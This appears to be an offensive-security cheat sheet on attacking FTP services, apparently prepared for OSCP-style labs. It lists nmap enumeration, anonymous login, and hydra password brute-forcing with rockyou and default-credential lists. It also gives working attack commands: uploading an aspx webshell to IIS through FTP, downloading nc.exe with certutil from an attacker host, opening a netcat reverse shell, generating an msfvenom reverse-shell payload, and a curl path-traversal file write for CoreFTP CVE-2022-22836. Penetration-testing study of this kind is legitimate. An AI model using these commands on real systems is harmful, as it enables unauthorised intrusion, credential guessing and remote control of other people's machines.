## Enumeration
### nmap 
```bash
sudo nmap -sV -p21 -sC -A 10.10.10.10
```

### anonymous login 
```bash
ftp <IP>
>anonymous
>anonymous
>ls -a   # List all files (even hidden) (yes, they could be hidden)
>binary  # Set transmission to binary instead of ascii
>ascii   # Set transmission to ascii instead of binary
>get file.txt  # download file
>put rev.aspx  # upload file 
>bye     # exit

# download all files
wget -m --no-passive ftp://anonymous:anonymous@IP
```

### bruteforce FTP login 
```bash
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ftp://IP
hydra -C /opt/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <IP> ftp
```
<br>

## FTP Attacks 
### IIS 7.0 (anonymous FTP + IIS) 
```bash
put cmd.aspx   # upload aspx webshell through FTP
http://ms01.oscp.exam:8000/cmd.aspx    # browse to webshell
certutil -urlcache -f http://192.168.45.210/nc.exe -o C:\Windows\Temp  # download nc.exe 
nc -lvnp 443  
.\nc.exe 192.168.45.201 443 -e cmd.exe
```
![image](https://github.com/GwenBSec/Pentest-Book/assets/88676386/0b36aac9-3e1e-4840-a7eb-adb50a5f3ef1)

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.18 LPORT=4444 -f aspx -o shell.aspx
put shell.aspx  # upload on ftp server
nc -lvnp 444     # start listener
10.10.10.5/shell.aspx   # browse to file
```
![image](https://github.com/GwenBSec/Pentest-Book/assets/88676386/73aee227-5c46-4092-8306-de2e939e95c6)

<br> 

### CoreFTP (CVE-2022-22836)

This vulnerability is for an FTP service that does not correctly process the HTTP PUT request and leads to an `authenticated` directory/path traversal, and arbitrary file write vulnerability. This vulnerability allows us to write files outside the directory to which the service has access.

```bash
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
C:\> type C:\whoops
```

<br>

## Resources 
Banzai (FTP + PHP) 

Devel (FTP + IIS) 


